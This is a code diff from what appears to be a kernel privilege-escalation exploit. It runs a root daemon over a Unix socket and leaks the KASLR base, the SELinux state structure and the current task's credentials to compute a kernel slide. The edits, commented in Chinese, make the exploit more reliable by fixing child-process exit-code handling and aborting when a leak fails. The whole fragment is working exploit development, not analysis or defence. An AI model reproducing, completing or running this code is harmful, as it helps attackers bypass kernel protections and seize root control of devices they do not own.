@@ -151,7 +151,7 @@ void run_rootd_daemon() {
     }
 
     signal(SIGPIPE, SIG_IGN);
-    signal(SIGCHLD, SIG_IGN); 
+    // 【关键修复】绝不能忽略 SIGCHLD，否则 waitpid 会失败，导致退出码永远是 1
 
     unlink(SOCKET_PATH);
     int server = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -216,7 +216,10 @@ void run_rootd_daemon() {
                 exit(1);
             }
             
-            int status; waitpid(inner, &status, 0);
+            int status = 0;
+            // 【关键修复】用循环等待，防止被其他信号打断
+            while (waitpid(inner, &status, 0) == -1 && errno == EINTR);
+            
             char exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
             write(client, &exit_code, 1);
             exit(0);
@@ -745,13 +748,22 @@ int main(int argc, char **argv) {
   if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;
 
   runtime_text = leak_text();
-  if (!runtime_text) { pr_error("KASLR leak failed\n"); }
+  if (!runtime_text) { 
+      printf(COLOR_RED "[!] " COLOR_DEFAULT "KASLR leak failed\n"); fflush(stdout);
+      exit(1); 
+  }
   
   k_selinux_state = leak_selinux_state();
-  if (!k_selinux_state) { pr_error("SELinux state leak failed\n"); }
+  if (!k_selinux_state) { 
+      printf(COLOR_RED "[!] " COLOR_DEFAULT "SELinux state leak failed\n"); fflush(stdout);
+      exit(1); 
+  }
   
   k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
-  if (!k_current_task) { pr_error("current task leak failed\n"); }
+  if (!k_current_task) { 
+      printf(COLOR_RED "[!] " COLOR_DEFAULT "current task leak failed\n"); fflush(stdout);
+      exit(1); 
+  }
   
   record_stage('1');
   uint64_t slide = runtime_text - LINK_TEXT;
@@ -951,6 +963,5 @@ int main(int argc, char **argv) {
       waitpid(child_pid, &status, 0);
   }
 
-  // 恢复最原始的保活方式：主进程原地死循环挂起
   for (;;) pause();
 }
